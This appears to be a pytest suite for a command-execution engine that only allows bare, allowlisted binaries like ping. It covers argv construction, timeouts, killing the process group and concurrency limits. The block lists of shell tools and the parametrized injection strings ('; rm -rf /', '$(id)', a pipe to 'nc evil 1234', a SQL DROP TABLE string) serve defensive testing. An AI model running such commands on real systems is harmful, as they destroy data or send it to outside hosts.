"""ExecutionEngine.

These tests use real processes rather than mocks for the timeout and
process-group behaviour, because the thing being verified is precisely what a
mock would paper over: that a signal actually reaches a grandchild.
"""

from __future__ import annotations

import asyncio
import os
import signal
import subprocess
import time

import pytest

from app.core.execution import (
    ExecutionBusy,
    ExecutionEngine,
    ExecutionRejected,
    ExecutionStatus,
    build_argv,
    resolve_binary,
)


class TestBinaryAllowlist:
    def test_resolves_an_allowed_binary_to_an_absolute_path(self) -> None:
        path = resolve_binary("ping")
        assert path.startswith("/")
        assert path.endswith("ping")

    @pytest.mark.parametrize("name", ["sh", "bash", "python3", "awk", "find", "sudo", "docker"])
    def test_refuses_programs_that_execute_arbitrary_commands(self, name: str) -> None:
        """Allowing any of these would defeat the argv discipline entirely —
        each one takes a command as an argument."""
        with pytest.raises(ExecutionRejected, match=r"never allowed|not an allowed"):
            resolve_binary(name)

    @pytest.mark.parametrize("name", ["curl", "wget", "cat", "ls", "rm"])
    def test_refuses_anything_not_on_the_allowlist(self, name: str) -> None:
        with pytest.raises(ExecutionRejected, match="not an allowed"):
            resolve_binary(name)

    @pytest.mark.parametrize(
        "name",
        ["/bin/sh", "../../bin/sh", "bin/ping", "ping ", " ping", "ping\n", ""],
    )
    def test_refuses_anything_that_is_not_a_bare_program_name(self, name: str) -> None:
        """A path must never reach `which` — that is the traversal route."""
        with pytest.raises(ExecutionRejected):
            resolve_binary(name)


class TestArgvConstruction:
    def test_each_argument_becomes_exactly_one_element(self) -> None:
        argv = build_argv("ping", ["-c", "1", "10.0.0.1"])
        assert argv[1:] == ["-c", "1", "10.0.0.1"]

    @pytest.mark.parametrize(
        "hostile",
        [
            "; rm -rf /",
            "$(id)",
            "`id`",
            "10.0.0.1 && id",
            "10.0.0.1 | nc evil 1234",
            "a\nb",
            "--flag=$(whoami)",
            "'; DROP TABLE device; --",
        ],
    )
    def test_shell_metacharacters_stay_a_single_literal_argument(self, hostile: str) -> None:
        """There is no shell, so these are inert. The assertion is that the
        engine neither splits nor rejects them — they are passed through as one
        opaque string, which is what makes local execution injection-proof."""
        argv = build_argv("ping", [hostile])
        assert argv[1] == hostile
        assert len(argv) == 2

    def test_nul_bytes_are_refused(self) -> None:
        """execve truncates at a NUL, so the kernel would see something other
        than what was validated."""
        with pytest.raises(ExecutionRejected, match="NUL"):
            build_argv("ping", ["10.0.0.1\x00; id"])

    def test_non_string_arguments_are_refused(self) -> None:
        with pytest.raises(ExecutionRejected, match="not a string"):
            build_argv("ping", [123])  # type: ignore[list-item]


class TestExecution:
    async def test_successful_run_captures_output(self) -> None:
        engine = ExecutionEngine()
        result = await engine.run("ping", ["-c", "1", "-W", "2", "127.0.0.1"], timeout=10)

        assert result.status is ExecutionStatus.SUCCESS
        assert result.exit_code == 0
        assert "127.0.0.1" in result.stdout
        assert result.duration_ms >= 0

    async def test_failure_is_reported_not_raised(self) -> None:
        engine = ExecutionEngine()
        result = await engine.run("ping", ["-c", "1", "-W", "1", "192.0.2.1"], timeout=8)
        assert result.status is ExecutionStatus.FAILED
        assert result.exit_code != 0

    async def test_rejects_an_out_of_range_timeout(self) -> None:
        engine = ExecutionEngine()
        for bad in (0, -1, 10_000):
            with pytest.raises(ExecutionRejected, match="timeout"):
                await engine.run("ping", ["-c", "1", "127.0.0.1"], timeout=bad)


class TestTimeoutAndProcessGroup:
    async def test_a_long_run_times_out(self) -> None:
        engine = ExecutionEngine()
        started = time.monotonic()
        result = await engine.run("ping", ["-c", "100", "-i", "1", "127.0.0.1"], timeout=1.5)
        elapsed = time.monotonic() - started

        assert result.status is ExecutionStatus.TIMEOUT
        # Killed near the deadline, not left to run to completion.
        assert elapsed < 10

    async def test_the_timed_out_process_is_actually_gone(self) -> None:
        """process.kill() would signal only the direct child. This asserts the
        process is not merely abandoned."""
        engine = ExecutionEngine()

        async def run() -> None:
            await engine.run("ping", ["-c", "60", "-i", "1", "127.0.0.1"], timeout=1.0)

        before = _ping_process_count()
        await run()
        await asyncio.sleep(0.5)
        after = _ping_process_count()

        assert after <= before, "a ping process survived the timeout"


class TestConcurrency:
    async def test_capacity_is_bounded_and_reports_busy(self) -> None:
        """Rejecting beats queueing: an operator waiting on a page needs to be
        told the system is busy, not left hanging."""
        engine = ExecutionEngine(max_concurrent=1)

        async def slow() -> None:
            await engine.run("ping", ["-c", "3", "-i", "1", "127.0.0.1"], timeout=10)

        task = asyncio.create_task(slow())
        await asyncio.sleep(0.3)

        with pytest.raises(ExecutionBusy):
            await engine.run("ping", ["-c", "1", "127.0.0.1"], timeout=5)

        await task

    async def test_the_permit_is_returned_after_a_failure(self) -> None:
        """A permit leaked on an error path is permanent, and enough of them
        stop the application executing anything."""
        engine = ExecutionEngine(max_concurrent=1)

        for _ in range(3):
            result = await engine.run("ping", ["-c", "1", "-W", "1", "192.0.2.1"], timeout=5)
            assert result.status is ExecutionStatus.FAILED

        # Still has capacity, so nothing was lost.
        assert (
            await engine.run("ping", ["-c", "1", "-W", "2", "127.0.0.1"], timeout=5)
        ).status is ExecutionStatus.SUCCESS

    async def test_the_permit_is_returned_after_a_timeout(self) -> None:
        engine = ExecutionEngine(max_concurrent=1)

        first = await engine.run("ping", ["-c", "30", "-i", "1", "127.0.0.1"], timeout=1.0)
        assert first.status is ExecutionStatus.TIMEOUT

        second = await engine.run("ping", ["-c", "1", "-W", "2", "127.0.0.1"], timeout=5)
        assert second.status is ExecutionStatus.SUCCESS

    async def test_discovery_has_its_own_budget(self) -> None:
        """One heavy scan must not consume the slots diagnostics need."""
        engine = ExecutionEngine(max_concurrent=1, max_discovery_concurrent=1)

        async def slow_discovery() -> None:
            await engine.run(
                "ping", ["-c", "3", "-i", "1", "127.0.0.1"], timeout=10, discovery=True
            )

        task = asyncio.create_task(slow_discovery())
        await asyncio.sleep(0.3)

        result = await engine.run("ping", ["-c", "1", "-W", "2", "127.0.0.1"], timeout=5)
        assert result.status is ExecutionStatus.SUCCESS

        await task


class TestOutputHandling:
    async def test_output_is_capped(self) -> None:
        engine = ExecutionEngine(max_output_bytes=256)
        result = await engine.run("ping", ["-c", "3", "-i", "0.3", "127.0.0.1"], timeout=10)

        assert len(result.stdout.encode()) <= 256 + 100  # allow the notice
        if result.truncated:
            assert "truncated" in result.stdout


def _ping_process_count() -> int:
    try:
        output = subprocess.run(
            ["ps", "-eo", "comm"], capture_output=True, text=True, timeout=5, check=False
        ).stdout
    except (OSError, subprocess.SubprocessError):  # pragma: no cover
        return 0
    return sum(1 for line in output.splitlines() if line.strip() == "ping")


def _pid_alive(pid: int) -> bool:  # pragma: no cover - helper
    try:
        os.kill(pid, signal.SIG_DFL)
    except ProcessLookupError:
        return False
    return True
